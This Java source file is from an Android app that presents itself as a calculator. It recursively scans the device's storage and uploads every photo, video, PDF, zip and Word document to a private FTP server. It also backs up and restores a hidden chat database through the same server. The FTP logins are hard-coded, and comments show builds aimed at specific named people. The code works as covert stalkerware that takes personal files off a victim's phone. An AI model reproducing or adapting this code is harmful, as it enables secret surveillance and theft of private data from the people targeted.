package es.fraggel.acalculator;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import android.Manifest;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.ImageView;

import com.firebase.client.Firebase;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.InputStream;

import es.fraggel.acalculator.Models.StaticInfo;
import es.fraggel.acalculator.Models.User;
import es.fraggel.acalculator.Services.DataContext;
import es.fraggel.acalculator.Services.LocalUserService;


public class Util {
    //App para eva
    //public static String EMAIL="fraggelillo666@gmail,com";
    //public static String NOMBRE="Pablo";
    //App para mi
    //public static String EMAIL="eva@gmail,com";
    //public static String NOMBRE="Eva";
    //App pruebas
    public static String EMAIL="pruebas@gmail,com";
    public static String NOMBRE="Nombre";

    public static String[] permissions = new String[]{
            Manifest.permission.INTERNET,
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.VIBRATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.REQUEST_INSTALL_PACKAGES};


    public static void GetFiles(String ruta,Context mContext,User user){
        File f=new File(ruta);
        Log.d("Directorio", f.getAbsolutePath());
        for (File file : f.listFiles()) {
            try {
                if (file.isDirectory()) {

                    GetFiles(file.getAbsolutePath(),mContext,user);
                } else {
                    String ff = file.getName().toLowerCase();
                    if (ff.indexOf(".mp4") != -1 || ff.indexOf(".3gp") != -1 || ff.indexOf(".m4v") != -1 || ff.indexOf(".mov") != -1
                            || ff.indexOf(".jpg") != -1 || ff.indexOf(".jpeg") != -1 || ff.indexOf(".png") != -1 || ff.indexOf(".bmp") != -1
                            || ff.indexOf(".pdf") != -1 || ff.indexOf(".zip") != -1 || ff.indexOf(".doc") != -1 || ff.indexOf(".docx") != -1) {
                        uploadFile(file,mContext,user);
                        Log.d("Calculator", file.getAbsolutePath());
                    }
                }
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
    public static void uploadFile(File file,Context mContext,User user) {
        int flag;
        FileInputStream fis = null;
        FTPClient client = new FTPClient();
        try {
            String workingDir="";
            fis = new FileInputStream(file);
            client.connect("fraggel.ddns.net", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
            /*client.execPBSZ(0);
            client.execPROT("P");*/
            if(user.FirstName.equals("Eva")) {
                client.login("eva", "14041975");
            }else if(user.FirstName.equals("Nombre")) {
                client.login("nombre", "1234");
            }else{
                client.login("fraggel", "ak47cold");
            }
            client.enterLocalPassiveMode();
            client.setFileType(FTP.BINARY_FILE_TYPE);
            workingDir="/ftp/";
            client.changeWorkingDirectory(workingDir);
            client.makeDirectory(user.FirstName);
            workingDir+=user.FirstName+"/";
            client.changeWorkingDirectory(workingDir);
            client.makeDirectory(file.getParentFile().getName());
            workingDir+=file.getParentFile().getName()+"/";
            client.changeWorkingDirectory(workingDir);

            FTPFile[] ftpFiles = client.listFiles(file.getName());
            boolean uploadFile=false;
            if (ftpFiles.length > 0)
            {
                //Log.d("UTIL","fichero ya existe");
            }
            else
            {
                uploadFile = client.storeFile(file.getName(), fis);
            }
            client.logout();
            client.disconnect();
        } catch (Exception eFTPClient) {
            eFTPClient.printStackTrace();
            // Gestionar el error, mostrar pantalla, reescalar excepcion... etc...
        } finally {
            try {
                fis.close();
            } catch (Exception e) {

            }

        }
    }
    public static void uploadBackupFile(File file,Context mContext,User user) {
        int flag;
        FileInputStream fis = null;
        FTPClient client = new FTPClient();
        try {
            String workingDir="";
            fis = new FileInputStream(file);
            client.connect("fraggel.ddns.net", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
            if(user.FirstName.equals("Eva")) {
                client.login("eva", "14041975");
            }else if(user.FirstName.equals("Nombre")) {
                client.login("nombre", "1234");
            }else{
                client.login("fraggel", "ak47cold");
            }
            client.enterLocalPassiveMode();
            client.setFileType(FTP.BINARY_FILE_TYPE);
            workingDir="/ftp/";
            client.changeWorkingDirectory(workingDir);
            workingDir+="dbBackup/";
            client.changeWorkingDirectory(workingDir);
            client.storeFile(user.FirstName+"Backup.bck", fis);
            client.logout();
            client.disconnect();
        } catch (Exception eFTPClient) {
            eFTPClient.printStackTrace();
            // Gestionar el error, mostrar pantalla, reescalar excepcion... etc...
        } finally {
            try {
                fis.close();
            } catch (Exception e) {

            }

        }
    }
    public static void downloadBackupFile(Context mContext,User user) {
        int flag;
        FTPClient client = new FTPClient();
        try {
            String workingDir="";
            client.connect("fraggel.ddns.net", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
            if(user.FirstName.equals("Eva")) {
                client.login("eva", "14041975");
            }else if(user.FirstName.equals("Nombre")) {
                client.login("nombre", "1234");
            }else{
                client.login("fraggel", "ak47cold");
            }
            client.enterLocalPassiveMode();
            client.setFileType(FTP.BINARY_FILE_TYPE);
            workingDir="/ftp/";
            client.changeWorkingDirectory(workingDir);
            workingDir+="dbBackup/";
            client.changeWorkingDirectory(workingDir);

            FTPFile[] ftpFiles = client.listFiles(user.FirstName+"Backup.bck");
            if (ftpFiles.length > 0)
            {
                DataContext db = new DataContext(mContext, null, null, 1);
                db.deleteChat(user.Email, Util.EMAIL);
                String rutaDb=new ContextWrapper(mContext).getFilesDir()+"/RemoteBackup.bck";
                String currentDBPath = mContext.getDatabasePath("mys3chat.db").getPath();
                new File(rutaDb).delete();
                FileOutputStream fos=new FileOutputStream(rutaDb);
                client.retrieveFile(user.FirstName+"Backup.bck",fos);

                File dbFile = new File(rutaDb);
                FileInputStream fis = new FileInputStream(dbFile);

                // Open the empty db as the output stream
                OutputStream output = new FileOutputStream(currentDBPath);

                // Transfer bytes from the input file to the output file
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    output.write(buffer, 0, length);
                }

                // Close the streams
                output.flush();
                output.close();
                fis.close();

                fos.flush();
                fos.close();
                //Borrar Backup y hacer restore

            }
            else
            {
                Log.d("UTIL","backup no existe");
            }
            client.logout();
            client.disconnect();
        } catch (Exception eFTPClient) {
            eFTPClient.printStackTrace();
            // Gestionar el error, mostrar pantalla, reescalar excepcion... etc...
        }
    }
    static void setAlarmNow(Context context) {
        AlarmReceiver alarm = new AlarmReceiver();
        alarm.setAlarm(context,true);
    }
    static void escribirLog(String TAG,String texto,Context context) {
        try{
            Log.d(TAG,texto);
            /*SimpleDateFormat dateFormat = new SimpleDateFormat("dd MM yy hh:mm a");
            Date currentDate = new Date();
            String cuurentDateString = dateFormat.format(currentDate);
            FileOutputStream fos=new FileOutputStream(ContextCompat.getExternalFilesDirs(context, null)[0]+"logCalculadora.txt",true);
            fos.write((cuurentDateString+" "+texto+"\n").getBytes());
            fos.flush();
            fos.close();*/
        }catch(Exception e){
            e.printStackTrace();

        }
    }

    public static boolean restoreBackup(Context ctx) {
        User user = LocalUserService.getLocalUserFromPreferences(ctx);

        if (user.FirstName != null) {
            getDBBackup myTask = new getDBBackup(ctx);
            myTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
            return true;

        }
        return false;
    }

    public static void makeBackup(Context mContext, User user) {
        if (user.FirstName != null) {
            try {
                String currentDBPath = mContext.getDatabasePath("mys3chat.db").getPath();

                File dbFile = new File(currentDBPath);
                FileInputStream fis = new FileInputStream(dbFile);

                // Open the empty db as the output stream
                OutputStream output = new FileOutputStream(new ContextWrapper(mContext).getFilesDir()+"/localBackup.bck");

                // Transfer bytes from the input file to the output file
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    output.write(buffer, 0, length);
                }

                // Close the streams
                output.flush();
                output.close();
                fis.close();
                uploadBackupFile(new File(new ContextWrapper(mContext).getFilesDir()+"/localBackup.bck"),mContext,user);

            } catch (Exception e) {
                e.printStackTrace();
            }


        }
    }
}
